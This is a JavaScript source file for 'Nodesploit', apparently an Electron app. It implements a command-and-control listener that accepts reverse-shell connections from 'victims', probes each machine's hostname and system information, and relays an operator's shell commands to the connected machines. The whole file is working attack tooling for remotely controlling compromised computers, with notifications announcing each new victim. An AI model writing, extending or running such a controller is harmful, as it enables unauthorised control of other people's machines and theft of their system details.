import store from '@/renderer/store'
import { nanoid } from 'nanoid'
import { Notification, ipcMain } from 'electron'

export class Nodesploit {
  /**
   * @param  {BrowserWindow} _mainWindow
   */
  constructor (window) {
    this.mainWin = window
    this.server = null
    this.sockets = new Map()
  }

  /**
     * Function to create and listening on server.
     * @param  {Object} connection
     * @return {Boolean} Listening OR Not listening
     */
  createServer (connection) {
    var net = require('net')
    this.server = new net.Server()

    process.on('SIGTERM', () => {
      this.server.close()
    })

    /**
       * This events is called when server is successfully listened, See {this.server.listen()} for more detaille
       */
    this.server.on('listening', () => {
      if (store.getters.notification) {
        var notif = new Notification({
          title: 'Server is ON',
          body: `Le serveur ecoute sur le port ${
              this.server.address().port
            } et l'adresse ${this.server.address().address}`
        })

        notif.show()
      }
    })

    /**
       * This event is called when server is successfully closed
       */
    this.server.on('close', () => {
      if (store.getters.notification) {
        var notif = new Notification({
          title: 'Server closed',
          body: "Le serveur n'ecoute plus sur le port"
        })
        notif.show()
      }
    })

    /**
       * @param  {Error} e
       * This events is called when error occur in server
       */
    this.server.on('error', (e) => {
      if (e.code === 'EADDRINUSE') {
        console.log('Address in use, retrying...')
      }
    })

    /**
       * This events is called when a new victime is connected to server
       */
    this.server.on('connection', (socket) => {
      var alreadyExist = false
      this.sockets.forEach((soc) => {
        if (soc.remoteAddress === socket.remoteAddress) {
          alreadyExist = true
        }
      })
      if (alreadyExist) {
        socket.end()
      } else {
        socket.setKeepAlive(true, Infinity)
        socket.setDefaultEncoding('utf8')
        socket.id = nanoid(10)

        this.addVictime(socket)

        socket.on('error', (e) => {
          console.log(e)
          if (e.code === 'ECONNRESET') {
            console.log('Socket end shell with CTRL+C')
            console.log('DEL[ERROR]: ' + socket.id)
          }
        })

        socket.on('close', () => {
          console.log('DEL[CLOSE]: ' + socket.id)
          this.deleteVictime(socket.id)
        })

        socket.on('end', () => {
          console.log('DEL[END]: ' + socket.id)
          this.deleteVictime(socket.id)
        })

        socket.on('timeout', () => {
          console.log('timeoiut .')
        })

        var cmd = ''
        ipcMain.on('cmd', (event, res) => {
          if (socket.id === res.id) {
            cmd = res.msg.trim() + '\n'
            var child = this.sockets.get(res.id)
            child.write(cmd)
          }
        })

        var hostname = false
        var systeminfo = false
        socket.on('data', (data) => {
          if (hostname) {
            console.log(
              'HOSTNAME: ' +
                  data
                    .toString()
                    .trim()
                    .split('\n')[0]
            )
            var victime = this.sockets.get(socket.id)
            victime.hostname = data.toString().trim()
            this.sockets.set(socket.id, victime)
            this.addInformation({
              id: socket.id,
              property: { name: 'hostname', data: data.toString().trim() }
            })
            hostname = false
          } else if (systeminfo) {
            this.mainWin.webContents.send('systeminfo', data.toString())
            systeminfo = false
          }
          data.toString().includes('hostname') ? (hostname = true) : (hostname = false)
          data.toString().includes('systeminfo /FO CSV') ? (systeminfo = true) : (systeminfo = false)
          this.mainWin.webContents.send('datarec', {
            data: data.toString('utf8'),
            id: socket.id
          })
        })
      }
    })

    /**
       * @param  {String} host
       * @param  {Number} port
       * This events is called to etablish listening in server with IP & Port
       */
    this.server.listen({ host: connection.ip, port: connection.port }, () => {
      console.log(`🔥 Server listen in ${connection.port}`)
    })

    return this.server.listening
  }

  /**
     * Function to close current open server.
     * @return {Boolean}
     */
  closeServer () {
    if (this.server.close()) {
      return true
    }
  }

  /**
     * Function to delete or close connection of 'x' victime.
     * @param {String} id
     */
  deleteVictime (id) {
    store.dispatch('REMOVE_CHILD', id)
    if (this.sockets.has(id)) {
      this.sockets.get(id).destroy()
      this.sockets.delete(id)
    }
  }

  addInformation (victime) {
    store.dispatch('ADD_INFORMATION', victime)
  }

  /**
     * Function to add socket in Sockets Map()
     * @param  {Socket} socket
     */
  addVictime (socket) {
    this.sockets.set(socket.id, socket)
    const victime = this.sockets.get(socket.id)
    victime.write('hostname' + '\n')
    store.dispatch('ADD_CHILD', {
      id: victime.id,
      ip: victime.remoteAddress,
      hostname: victime.hostname
    })
    console.log(`[💀] New Victime: ${victime.id}`)

    if (store.getters.notification) {
      var notif = new Notification({
        title: 'Nouvelles connexion !',
        body: `une nouvelles connexion entrant ${victime.remoteAddress}`
      })
      notif.show()
    }
  }
}
